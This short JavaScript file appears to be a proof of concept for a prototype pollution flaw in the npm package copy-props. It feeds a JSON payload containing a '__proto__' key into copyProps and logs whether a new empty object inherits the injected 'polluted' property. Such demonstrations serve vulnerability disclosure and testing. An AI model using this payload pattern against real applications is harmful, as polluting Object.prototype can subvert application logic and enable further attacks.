var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const copyProps = require('copy-props');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
copyProps(JSON.parse(malicious_payload), obj);
console.log({}.polluted);